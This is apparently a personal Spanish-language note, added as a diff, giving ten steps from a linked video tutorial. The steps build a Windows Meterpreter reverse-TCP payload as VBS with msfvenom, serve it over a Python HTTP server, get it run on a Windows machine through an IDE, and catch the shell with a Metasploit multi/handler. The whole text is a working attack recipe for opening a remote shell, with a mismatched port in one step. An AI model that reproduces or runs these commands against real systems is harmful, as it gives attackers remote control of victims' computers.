@@ -1,0 +1,21 @@
+// Tutorial en: https://www.youtube.com/watch?v=a4WZjLWGA0w
+
+1. sudo msfvenom -p windows/meterpreter/reverse_tcp -f vbs --smallest LHOST=ip LPORT=4444 -o (directorio)/payload.txt
+
+2. cd (directorio)
+
+3. python3 -m http.server 8080
+
+4. Voy a windows y lo copio desde http://IP:4444/"
+
+5. Voy al IDE, cargo el script con la página y voy a linux de nuevo
+
+6. msfconsole
+
+7. use multi/handler
+
+8. set payload windows/meterpreter/reverse_tcp
+
+9. set lport 4444 > set lhost ip
+
+10. exploit
